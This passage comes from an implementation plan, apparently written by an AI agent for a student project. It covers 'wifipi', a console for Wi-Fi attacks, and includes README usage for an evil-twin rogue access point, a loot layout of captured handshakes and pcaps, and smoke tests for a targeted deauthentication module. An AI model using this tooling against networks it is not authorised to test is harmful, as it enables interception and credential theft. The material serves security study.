setg BSSID <REAL_BSSID> ; setg SSID "<REAL_SSID>" ; setg CHANNEL <ch>
setg CLIENT <phone_MAC>
setg WPA_PASSPHRASE password123    # omit for an open rogue
run
wifipi [1j] > jobs    # watch it run
wifipi [1j] > kill 0  # tear down
```

**Cleanup after anything:**
```
use util/cleanup
run
```

## Artefacts

Everything lands under `./loot/` in timestamped per-run dirs:

```
loot/
  scans/2026-04-17_18-30-12-recon-scan/      airodump-01.cap, run.log
  handshakes/2026-04-17_18-35-04-handshake/  handshake-01.cap, run.log, aircrack.log
  evil-twin/2026-04-17_18-40-00-eviltwin/    hostapd.log, dnsmasq.log, rogue.pcap, run.log
  attacks/...
  crack/...
```

`loot` in the console lists the 20 most recent runs. `loot clean` wipes
the tree (with a confirmation).

## The legacy bash scripts

`scripts/legacy/` contains the original numbered shell scripts this
project started as. They are preserved for reference but not maintained
— use the console.

## Testing

```bash
pytest tests/ -v
```

Tests cover option resolution, `iw dev` parsing, inventory parsing,
job lifecycle, and every module's `build_argv`. They do not exercise
wireless hardware.
```

- [ ] **Step 2: Final end-to-end smoke check**

Run (must be root):
```bash
sudo ./wifipi.sh
```

Press Enter past the banner. Expected behaviour:
- Banner printed.
- `[*] loaded N modules; inventory: ... BSSIDs, ... clients`
- `wifipi >` prompt appears.

At prompt:
- `show modules` — lists all expected modules.
- `info attack/deauth-targeted` — prints description + options.
- `use attack/deauth-targeted` — prompt becomes `wifipi (deauth-targeted) >`.
- `show options` — table printed.
- `exit` — exits cleanly.

- [ ] **Step 3: Run the whole test suite**

Run: `pytest tests/ -v`
Expected: All tests pass (procutil, inventory, options, ifaces, jobs, loot, module discovery, module argvs).

- [ ] **Commit checkpoint** — "rewrite README around the console + final smoke".

---

## Self-review notes

Spec coverage was walked section by section and every requirement maps to a task above. Interface roles are covered in Task 5 (data structures) and Task 10 (commands). The live `[<n>j]` prompt + async finish alerts are in Task 9 (dynamic prompt) and Task 11 (jobs command + alert already wired in Task 9's `_on_job_finish`). The exit guard is in Task 11. The soft confirmation gate (sleep + printed summary, `CONFIRM` bypass) is in Task 9's `_confirm_attack`. Background modules use the runner-as-subprocess pattern consistently (Tasks 19, 22) so that `JobManager` only has to manage one PID per module.

Placeholders: none. Every code step contains the full code, every test step contains the full test, every command step gives the exact expected output class.

Type consistency: `OptionSpec.kind` is a free-form string (`"string"` / `"mac"` / `"bssid"` / …) used only for eventual validation polish; it is never `enum`-typed across tasks. `Role` is the single enum source and every module refers to it via `Role.MON` / `Role.ATTACK` / `Role.AP` or via the well-known global-key string (`MON_IFACE`, etc.) consistently.

One known gap relative to the spec: there is no dedicated unit test for the dynamic prompt rendering. `postcmd` + `_render_prompt` is small and exercised by the Task 12 smoke test, but a cmd2 prompt-rendering test was judged not worth the fixture cost for a school project.
